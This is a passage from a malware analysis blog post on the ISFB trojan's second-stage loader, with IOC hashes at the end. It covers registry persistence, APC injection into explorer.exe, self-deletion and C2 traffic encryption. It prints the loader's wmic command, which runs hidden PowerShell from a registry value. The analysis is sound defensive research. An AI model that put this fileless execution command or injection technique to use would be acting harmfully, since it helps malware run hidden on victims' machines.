<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="946" height="735" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29.png" alt="" class="wp-image-4727" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29.png 946w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29-600x466.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29-300x233.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29-768x597.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_29-720x559.png 720w" sizes="(max-width: 946px) 100vw, 946px" /></figure></div>



<p>Moving back to the previous function, the loader calls <strong>Create_Registry_Keys</strong> (sub_1D4912), which, as the name suggests, creates registry keys using COM API. The created registry keys can be seen below, and are all in the same registry folder  <strong>Software\AppDataLow\Software\Microsoft\17B9B5BC-8A83-619D-4C3B-5E25409F7229</strong> &#8211; everything after <strong>AppDataLow</strong> is created by the loader.</p>



<pre class="wp-block-code"><code>Client32: Encrypted client 32 bit binary (Rotating XOR algorithm)
Client64: Encrypted client 64 binary (Rotating XOR algorithm)
basegcfg: Powershell "script" containing 
apiMider: WMIC Command pointing to Powershell script</code></pre>



<p>You might be wondering, what is this &#8220;WMIC Command&#8221;? Well, the loader actually creates a command to execute the Powershell script, rather than calling Powershell directly, and it can be seen below, and it essentially executes the Powershell script stored in <strong>basegcfg</strong>:</p>



<pre class="wp-block-code"><code>C:\Windows\system32\wbem\wmic.exe /output:clipboard process call create "powershell -w hidden iex(&#91;System.Text.Encoding]::ASCII.GetString((get-itemproperty 'HKCU:\Software\AppDataLow\Software\Microsoft\17B9B5BC-8A83-619D-4C3B-5E25409F7229').basegcfg))</code></pre>



<p>This is then executed using COM API once again, rather than calling a well known API such as <strong>ShellExecuteExW()</strong>, which is used to execute CMD.exe.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" decoding="async" width="1024" height="725" src="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-1024x725.png" alt="" class="wp-image-4728" srcset="https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-1024x725.png 1024w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-600x425.png 600w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-300x212.png 300w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-768x544.png 768w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30-720x510.png 720w, https://www.0ffset.net/wp-content/uploads/2021/06/Screenshot_30.png 1333w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Once this function returns, we can now see all the data and registry keys that this loader creates, although the next stage also utilizes this area of the registry, so try not to get confused with different keys being added.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img decoding="async" src="blob:https://www.0ffset.net/6fb041c4-bfc9-42b0-a741-2d7861bd9eef" alt="" class="wp-image-2316"/></figure></div>



<p>Once everything has been setup and executed, one last function is called in the loader, and it is responsible for deleting the original file, leaving no visible trace of any infections. All it does is use <strong>ShellExecuteExW()</strong> to execute CMD.exe, passing a command line argument that executes <strong>ping</strong> against the localhost, and then deletes itself from the system, leaving the next stage running silently.</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://www.0ffset.net/wp-content/uploads/2019/05/Screenshot_32.png" alt="" class="wp-image-2317"/></figure></div>



<p>So, now we know how the loader functions, lets take a quick look at that powershell script again:</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://i2.wp.com/0ffset.net/wp-content/uploads/2019/05/Screenshot_25-1.png?fit=1024%2C333&amp;ssl=1" alt="" class="wp-image-2318"/></figure></div>



<p>So, we can see that it is calling <strong>VirtualAllocEx()</strong>, which is then used as the destination argument for a call to <strong>Copy()</strong>, meaning the allocated memory will contain what we now know is the (converted to integer) executable. Then, <strong>QueueUserAPC() </strong>is called, and as described by John Arneson at <strong><a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://blog.talosintelligence.com/2019/01/amp-tracks-ursnif.html" target="_blank">Talos</a></strong>:</p>



<pre class="wp-block-code"><code>QueueUserAPC is executed, specifying the current thread within its process. This creates a user-mode APC and queues it within the thread. To execute the malicious DLL from the APC queue, the thread needs to enter an alertable state. SleepEx is used to trigger an alertable state completing the APC injection, by specifying 1 (True) for its second parameter which is bAlertable.</code></pre>



<p>By following execution of this script, we can see that it injects into explorer.exe &#8211; mainly due to the fact that as soon as the script executes, we can see explorer.exe communicate out to different C2 servers. Now I&#8217;m not entirely sure on how calling <strong>QueueUserAPC()</strong> on it&#8217;s own thread enables the process to inject into explorer.exe, as most write-ups on APC injection involve passing the thread of the process to inject into, and in this case it is passing it&#8217;s own thread ID. Perhaps due to the fact that it is being executed with WMI? If you want to learn more about APC injection, you can check out this great post by Pavel<strong> <a rel="noreferrer noopener" aria-label="here (opens in a new tab)" href="https://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/" target="_blank">here</a></strong>.</p>



<p>So, that brings an end to this analysis! You can find a summary down below, as well as all IOCs associated with this sample &#8211; and if you would like to get a hold of the PCAP that I used, DM me on Twitter (<strong><a rel="noreferrer noopener" aria-label="@0verfl0w_ (opens in a new tab)" href="https://twitter.com/0verfl0w_" target="_blank">@0verfl0w_</a></strong>), and I can pass it on! Hopefully you learnt something from this post, and part 3 (the final stage), should be up fairly soon! Thanks for reading!</p>



<pre class="wp-block-code"><code>Summary:
    Parses "JJ" Structure to get RSA key + Configuration
    Utilizes COM API to communicate to C2 servers through Internet Explorer
        Alters three registry keys to run silently:
            SOFTWARE\Microsoft\Internet Explorer\Main\IE10RunOnceLastShown_TIMESTAMP
            SOFTWARE\Microsoft\Internet Explorer\Main\IE8RunOnceLastShown_TIMESTAMP
            SOFTWARE\Microsoft\Internet Explorer\Main\Check_Associations
        Generates string to use in communication with C2 servers:
            soft=%u&amp;version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;crc=%x&amp;uptime=%u
        The string is Serpent CBC encrypted, with the 16 byte config key + 16 byte nulled IV
        A random string is prepended, the string is Base64 encoded, '+' and '/' are replaced with 
        hex equivalents, random '/' are added to string, '/images/' is prepended and '.avi' is 
        appended
        The last 64 bytes of the received data from the C2 is RSA decrypted using the RSA key
        This block contains the MD5 hash of decrypted data, the Serpent key to decrypt, and the
        size of the data to decrypt
        The loader reaches out 3 times, the first two to get a 32 and 64 bit executable, and the
        third to get a Powershell script used for APC injection later on
    The correct executable (architecture wise) is converted to integers and input into the Powershell
    script, replacing @CODE@
    Four registry keys are created, containing the two downloaded, encrypted executables, the
    Powershell script, and a WMIC command executing the Powershell script
        Client32: Encrypted client 32 bit binary (Rotating XOR algorithm)
        Client64: Encrypted client 64 binary (Rotating XOR algorithm)
        basegcfg: Powershell "script" containing 
        apiMider: WMIC Command pointing to Powershell script
    The loader then uses COM API to execute apiMider, executing the Powershell script that uses
    APC injection to inject the downloaded executable into explorer.exe
    The loader executes CMD.exe that executes ping.exe against the localhost, and deletes itself
    from the system
    The loader then exits, leaving the final stage running in explorer.exe</code></pre>



<pre class="wp-block-code"><code>IOCs:
    MD5 of Second Stage Loader: 52b4480de6f4d4f32fba2b535941c284
    MD5 of x32 Downloaded Executable: 14373f33e1907b5d82747bed1f1aacaf
    MD5 of x64 Downloaded Executable: 468d291ca5e63470a351ac73ff3621ba</code></pre>

        </div><!-- .entry-content -->
        <div class="entry-footer clearfix">
            <span class="sl-wrapper"><a href="https://www.0ffset.net/wp-admin/admin-ajax.php?action=process_simple_like&post_id=2117&nonce=3c5728b9c0&is_comment=0&disabled=true" class="sl-button sl-button-2117" data-nonce="3c5728b9c0" data-post-id="2117" data-iscomment="0" title="Like"><span class="sl-icon"><svg role="img" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0" y="0" viewBox="0 0 128 128" enable-background="new 0 0 128 128" xml:space="preserve"><path id="heart" d="M64 127.5C17.1 79.9 3.9 62.3 1 44.4c-3.5-22 12.2-43.9 36.7-43.9 10.5 0 20 4.2 26.4 11.2 6.3-7 15.9-11.2 26.4-11.2 24.3 0 40.2 21.8 36.7 43.9C124.2 62 111.9 78.9 64 127.5zM37.6 13.4c-9.9 0-18.2 5.2-22.3 13.8C5 49.5 28.4 72 64 109.2c35.7-37.3 59-59.8 48.6-82 -4.1-8.7-12.4-13.8-22.3-13.8 -15.9 0-22.7 13-26.4 19.2C60.6 26.8 54.4 13.4 37.6 13.4z"/>&#9829;</svg></span></a><span id="sl-loader"></span></span>        </div>
        <div class="share-post"></div>        <div class="author-bio" ><div class="author-image"><img alt='' src='https://secure.gravatar.com/avatar/4646d0a6fcf15f17545b9a8708b8c3b4?s=250&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4646d0a6fcf15f17545b9a8708b8c3b4?s=500&#038;d=mm&#038;r=g 2x' class='avatar avatar-250 photo' height='250' width='250' decoding='async'/></div><div class="author-info"><p class="title text-primary font-second">Author</p><h6>0verfl0w_</h6><p class="des"></p><div class="author-socials"></div></div></div>        <div class="post-nav clearfix"><div class="post-prev"><a href="https://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/" rel="prev"><h6>Analysing ISFB &#8211; The First Loader</h6><span>13th March 2019</span></a></div><div class="post-next"><a href="https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-turlas-keylogger-1/" rel="next"><h6>Analyzing KSL0T (Turla’s Keylogger), Part 1 &#8211; Reupload</h6><span>8th July 2019</span></a></div></div>    </div>
</article>

<div id="comments" class="comments-area">

    
        <h4 class="comments-title">Comment (1)</h4>

        <ol class="comment-list">
            
        <li id="comment-38" class="pingback even thread-even depth-1 comment-item">
            <article class="comment-wrap clearfix">

                <div class="gravatar">
                                    </div>

                <div class="comment-content">
                    <div class="comment-meta">
                        <h6 class="comment-author">Analyzing ISFB &#8211; The Second Loader &#8211; 0ffset &#8211; The Library 6.0</h6>
                        <span class="comment-time">28th May 2019</span>
                        <div class="comment-reply"></div>
                    </div>
                    <div class="comment-text">
                                                    <p>[&#8230;] <a href="https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/" rel="ugc">https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/</a> [&#8230;]</p>
                                            </div>
                </div>

            </article>
        </li>

        </li><!-- #comment-## -->
        </ol><!-- .comment-list -->

                    <p class="no-comments">Comments are closed.</p>
        
</div><!-- #comments -->
					</main><!-- #main -->
				</div><!-- #primary -->
				
				
<aside id="primary-sidebar" class="widget-area primary-sidebar col-lg-3 col-md-3 col-sm-12 col-xs-12">
	<section id="recent_news-1" class="widget widget_recent_news"><h5 class="widget-title">Recent Posts</h5>            <ul class="recent-news clearfix">
                                                <li class="clearfix"> 
                                        <div class="thumb">
                        <a href="https://www.0ffset.net/reverse-engineering/guloaders-stack-manipulation/">
                            <img width="150" height="150" src="https://www.0ffset.net/wp-content/uploads/2022/12/gl_decomp_view-150x150.png" class="attachment-thumbnail size-thumbnail wp-post-image" alt="" decoding="async" srcset="https://www.0ffset.net/wp-content/uploads/2022/12/gl_decomp_view-150x150.png 150w, https://www.0ffset.net/wp-content/uploads/2022/12/gl_decomp_view-720x720.png 720w, https://www.0ffset.net/wp-content/uploads/2022/12/gl_decomp_view-300x300.png 300w, https://www.0ffset.net/wp-content/uploads/2022/12/gl_decomp_view-100x100.png 100w" sizes="(max-width: 150px) 100vw, 150px" />                        </a>
                    </div>
                                        <div class="entry-header">
                        <h6>
                            <a href="https://www.0ffset.net/reverse-engineering/guloaders-stack-manipulation/">GuLoader&#8217;s Unique Approach to Obfuscation: Understanding Stack Manipulation</a>
                        </h6>
                                                <span class="post-on">
                            <span class="entry-date">4th December 2022</span>
                        </span>
                                            </div>
                </li>
                                                <li class="clearfix"> 
                                        <div class="thumb">
                        <a href="https://www.0ffset.net/reverse-engineering/yara-byte-patterns/">
                            <img width="150" height="150" src="https://www.0ffset.net/wp-content/uploads/2022/11/featured-150x150.png" class="attachment-thumbnail size-thumbnail wp-post-image" alt="" decoding="async" srcset="https://www.0ffset.net/wp-content/uploads/2022/11/featured-150x150.png 150w, https://www.0ffset.net/wp-content/uploads/2022/11/featured-720x720.png 720w, https://www.0ffset.net/wp-content/uploads/2022/11/featured-300x300.png 300w, https://www.0ffset.net/wp-content/uploads/2022/11/featured-100x100.png 100w" sizes="(max-width: 150px) 100vw, 150px" />                        </a>
                    </div>
                                        <div class="entry-header">
                        <h6>
                            <a href="https://www.0ffset.net/reverse-engineering/yara-byte-patterns/">Developing YARA Rules Based on Byte Patterns: ROMCOM</a>
                        </h6>
                                                <span class="post-on">
                            <span class="entry-date">27th November 2022</span>
                        </span>
                                            </div>
                </li>
                                                <li class="clearfix"> 
                                        <div class="thumb">
                        <a href="https://www.0ffset.net/reverse-engineering/analysing-snake-ransomware/">
                            <img width="150" height="150" src="https://www.0ffset.net/wp-content/uploads/2022/11/image034-150x150.png" class="attachment-thumbnail size-thumbnail wp-post-image" alt="" decoding="async" srcset="https://www.0ffset.net/wp-content/uploads/2022/11/image034-150x150.png 150w, https://www.0ffset.net/wp-content/uploads/2022/11/image034-300x300.png 300w, https://www.0ffset.net/wp-content/uploads/2022/11/image034-100x100.png 100w" sizes="(max-width: 150px) 100vw, 150px" />                        </a>
                    </div>
                                        <div class="entry-header">
                        <h6>
                            <a href="https://www.0ffset.net/reverse-engineering/analysing-snake-ransomware/">Reversing Golang Developed Ransomware: SNAKE</a>
                        </h6>
                                                <span class="post-on">
                            <span class="entry-date">23rd November 2022</span>
                        </span>
                                            </div>
                </li>
                            </ul>

    </section></aside><!-- #secondary -->
			</div>
		</div>	
	</div>

	</div><!-- #content -->
	<footer id="site-footer" class="site-footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">		<div data-elementor-type="wp-post" data-elementor-id="1308" class="elementor elementor-1308" data-elementor-post-type="ot_footer_builders">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-d0f9bfa ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d0f9bfa" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}">
						<div class="elementor-container elementor-column-gap-extended">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-89daaf1 ot-flex-column-vertical" data-id="89daaf1" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-e89c64b elementor-section-full_width ot-traditional elementor-section-height-default elementor-section-height-default" data-id="e89c64b" data-element_type="section">
						<div class="elementor-container elementor-column-gap-extended">
					<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-8d8441e ot-flex-column-vertical" data-id="8d8441e" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-8914b33 elementor-widget elementor-widget-icontact_info" data-id="8914b33" data-element_type="widget" data-widget_type="icontact_info.default">
				<div class="elementor-widget-container">
										<div class="contact-info box-style2">
					<div class="box-icon">
									    				        		<i class="flaticon-world-globe"></i>					</div>
		        	<p>5 The Quadrant, Coventry, U.K.</p>
		        	<h6>Our Address</h6>			        				        
			    </div>
		    	    		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-5ebca85 ot-flex-column-vertical" data-id="5ebca85" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-4405434 elementor-widget elementor-widget-icontact_info" data-id="4405434" data-element_type="widget" data-widget_type="icontact_info.default">
				<div class="elementor-widget-container">
										<div class="contact-info box-style2">
					<div class="box-icon">
									    		<img src="https://www.0ffset.net/wp-content/uploads/2022/07/0ffset-rounded-01.png" alt="">		        							</div>
		        	<p></p>
		        	<h6></h6>			        				        
			    </div>
		    	    		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-c9201b5 ot-flex-column-vertical" data-id="c9201b5" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-1a1bfdb elementor-widget elementor-widget-icontact_info" data-id="1a1bfdb" data-element_type="widget" data-widget_type="icontact_info.default">
				<div class="elementor-widget-container">
										<div class="contact-info box-style2">
					<div class="box-icon">
									    				        		<i class="flaticon-envelope"></i>					</div>
		        	<p>contact@0ffset.net</p>
		        	<h6>Our Mailbox</h6>			        				        
			    </div>
		    	    		</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<div class="elementor-element elementor-element-c208bbf elementor-widget elementor-widget-text-editor" data-id="c208bbf" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p><span style="color: #000000;">Copyright © 2022 <strong><a style="color: #000000;" href="http://0ffset.net">0ffset Training Solutions LTD.</a></strong> All Rights Reserved.</span></p>						</div>
				</div>
				<div class="elementor-element elementor-element-9438214 elementor-grid-3 elementor-shape-rounded e-grid-align-center elementor-widget elementor-widget-social-icons" data-id="9438214" data-element_type="widget" data-widget_type="social-icons.default">
				<div class="elementor-widget-container">
					<div class="elementor-social-icons-wrapper elementor-grid">
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-animation-float elementor-repeater-item-a24d46e" href="https://twitter.com/0verfl0w_" target="_blank">
						<span class="elementor-screen-only">Twitter</span>
						<i class="fab fa-twitter"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin-in elementor-animation-float elementor-repeater-item-b0dbeaa" href="https://www.linkedin.com/company/0ffset/" target="_blank">
						<span class="elementor-screen-only">Linkedin-in</span>
						<i class="fab fa-linkedin-in"></i>					</a>
				</span>
							<span class="elementor-grid-item">
					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-animation-float elementor-repeater-item-6b456a7" href="https://www.youtube.com/channel/UCy21puSd9R3C5Xn46YI32_g" target="_blank">
						<span class="elementor-screen-only">Youtube</span>
						<i class="fab fa-youtube"></i>					</a>
				</span>
					</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
							</div>
		</footer></div><!-- #page -->


		<script>
			window.RS_MODULES = window.RS_MODULES || {};
			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
			window.RS_MODULES.defered = true;
			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
			window.RS_MODULES.type = 'compiled';
		</script>
		<a id="back-to-top" href="#" class="show"><i class="flaticon-up-arrow"></i></a>		<div data-elementor-type="popup" data-elementor-id="7991" class="elementor elementor-7991 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;none&quot;,&quot;prevent_close_on_esc_key&quot;:&quot;yes&quot;,&quot;avoid_multiple_popups&quot;:&quot;yes&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.1999999999999999555910790149937383830547332763671875,&quot;sizes&quot;:[]},&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;triggers&quot;:{&quot;scrolling_offset&quot;:10,&quot;scrolling&quot;:&quot;yes&quot;,&quot;scrolling_direction&quot;:&quot;down&quot;},&quot;timing&quot;:{&quot;times_times&quot;:1,&quot;times&quot;:&quot;yes&quot;,&quot;devices_devices&quot;:[&quot;desktop&quot;,&quot;mobile&quot;],&quot;devices&quot;:&quot;yes&quot;,&quot;times_count&quot;:&quot;close&quot;}}" data-elementor-post-type="elementor_library">
								<section class="elementor-section elementor-top-section elementor-element elementor-element-16a20fb3 elementor-section-height-min-height elementor-section-items-stretch elementor-reverse-mobile ot-traditional elementor-section-boxed elementor-section-height-default" data-id="16a20fb3" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-40851bae ot-flex-column-vertical" data-id="40851bae" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-2f4506f elementor-widget elementor-widget-heading" data-id="2f4506f" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h4 class="elementor-heading-title elementor-size-default">The Remastered<br>Beginner Malware Analysis Course</h4>		</div>
				</div>
				<div class="elementor-element elementor-element-4076d27b animated-slow elementor-invisible elementor-widget elementor-widget-heading" data-id="4076d27b" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;bounceIn&quot;,&quot;_animation_delay&quot;:0}" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Pre-registration is now open</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-cba2cc5 elementor-widget elementor-widget-text-editor" data-id="cba2cc5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p style="text-align: center;">Don&#8217;t miss out! Add your email to get notified of course updates, and grab a <strong>15% discount</strong> as well as <strong>1-week early access</strong>!</p>						</div>
				</div>
				<div class="elementor-element elementor-element-6450da54 elementor-button-align-center labelcentered elementor-widget elementor-widget-form" data-id="6450da54" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default">
				<div class="elementor-widget-container">
					<form class="elementor-form" method="post" name="preregister">
			<input type="hidden" name="post_id" value="7991"/>
			<input type="hidden" name="form_id" value="6450da54"/>
			<input type="hidden" name="referer_title" value="Analyzing ISFB – The Second Loader | 0ffset Training Solutions" />

							<input type="hidden" name="queried_id" value="2117"/>
			
			<div class="elementor-form-fields-wrapper elementor-labels-">
								<div class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-field_1887d7b elementor-col-80 elementor-field-required">
												<label for="form-field-field_1887d7b" class="elementor-field-label elementor-screen-only">
								Name							</label>
														<input size="1" type="text" name="form_fields[field_1887d7b]" id="form-field-field_1887d7b" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Name" required="required" aria-required="true">
											</div>
								<div class="elementor-field-type-email elementor-field-group elementor-column elementor-field-group-field_ac3dc4b elementor-col-80 elementor-field-required">
												<label for="form-field-field_ac3dc4b" class="elementor-field-label elementor-screen-only">
								Email							</label>
														<input size="1" type="email" name="form_fields[field_ac3dc4b]" id="form-field-field_ac3dc4b" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Email" required="required" aria-required="true">
											</div>
								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
					<button type="submit" class="elementor-button elementor-size-sm elementor-animation-sink">
						<span >
															<span class=" elementor-button-icon">
																										</span>
																						<span class="elementor-button-text">Secure Early-Access</span>
													</span>
					</button>
				</div>
			</div>
		</form>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-4b6d4c9 ot-flex-column-vertical" data-id="4b6d4c9" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
					<div class="elementor-background-overlay"></div>
								<div class="elementor-element elementor-element-1663789e elementor-widget elementor-widget-spacer" data-id="1663789e" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
						</div>
			<script type="text/javascript">
		(function () {
			var c = document.body.className;
			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
			document.body.className = c;
		})();
	</script>
	
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="pswp__bg"></div>
	<div class="pswp__scroll-wrap">
		<div class="pswp__container">
			<div class="pswp__item"></div>
			<div class="pswp__item"></div>
			<div class="pswp__item"></div>
		</div>
		<div class="pswp__ui pswp__ui--hidden">
			<div class="pswp__top-bar">
				<div class="pswp__counter"></div>
				<button class="pswp__button pswp__button--close" aria-label="Close (Esc)"></button>
				<button class="pswp__button pswp__button--share" aria-label="Share"></button>
				<button class="pswp__button pswp__button--fs" aria-label="Toggle fullscreen"></button>
				<button class="pswp__button pswp__button--zoom" aria-label="Zoom in/out"></button>
				<div class="pswp__preloader">
					<div class="pswp__preloader__icn">
						<div class="pswp__preloader__cut">
							<div class="pswp__preloader__donut"></div>
						</div>
					</div>
				</div>
			</div>
			<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
				<div class="pswp__share-tooltip"></div>
			</div>
			<button class="pswp__button pswp__button--arrow--left" aria-label="Previous (arrow left)"></button>
			<button class="pswp__button pswp__button--arrow--right" aria-label="Next (arrow right)"></button>
			<div class="pswp__caption">
				<div class="pswp__caption__center"></div>
			</div>
		</div>
	</div>
</div>
<script type="text/template" id="tmpl-variation-template">
	<div class="woocommerce-variation-description">{{{ data.variation.variation_description }}}</div>
	<div class="woocommerce-variation-price">{{{ data.variation.price_html }}}</div>
	<div class="woocommerce-variation-availability">{{{ data.variation.availability_html }}}</div>
</script>
<script type="text/template" id="tmpl-unavailable-variation-template">
	<p>Sorry, this product is unavailable. Please choose a different combination.</p>
</script>
<link rel='stylesheet' id='elementor-post-2840-css' href='https://www.0ffset.net/wp-content/uploads/elementor/css/post-2840.css?ver=1703230942' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-post-1308-css' href='https://www.0ffset.net/wp-content/uploads/elementor/css/post-1308.css?ver=1703230942' type='text/css' media='all' />
<link rel='stylesheet' id='e-animations-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=3.18.3' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-2-css' href='https://fonts.googleapis.com/css?family=Nunito+Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-shared-0-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-brands-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/font-awesome/css/brands.min.css?ver=5.15.3' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-solid-css' href='https://www.0ffset.net/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3' type='text/css' media='all' />
<link rel='stylesheet' id='rs-plugin-settings-css' href='https://www.0ffset.net/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.6.7' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
</style>
<link rel='stylesheet' id='photoswipe-css' href='https://www.0ffset.net/wp-content/plugins/woocommerce/assets/css/photoswipe/photoswipe.min.css?ver=8.4.0' type='text/css' media='all' />
<link rel='stylesheet' id='photoswipe-default-skin-css' href='https://www.0ffset.net/wp-content/plugins/woocommerce/assets/css/photoswipe/default-skin/default-skin.min.css?ver=8.4.0' type='text/css' media='all' />
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=5.8.5" id="swv-js"></script>
<script type="text/javascript" id="contact-form-7-js-extra">
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/www.0ffset.net\/wp-json\/","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.8.5" id="contact-form-7-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.6.7" defer async id="tp-tools-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.6.7" defer async id="revmin-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/royal_preloader.min.js?ver=20180910" id="royal-preloader-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-includes/js/imagesloaded.min.js?ver=5.0.0" id="imagesloaded-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/jquery.magnific-popup.min.js?ver=20180910" id="magnific-popup-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/jquery.isotope.min.js?ver=20190829" id="isotope-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/slick.min.js?ver=20180910" id="slick-slider-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/easypiechart.min.js?ver=20190829" id="easypiechart-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/jquery.countdown.min.js?ver=20180910" id="countdown-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/elementor.js?ver=20180910" id="engitech-elementor-js"></script>
<script type="text/javascript" src="https://www.0ffset.net/wp-content/themes/engitech/js/elementor-header.js?ver=20180910" id="engitech-elementor-header-js"></script>
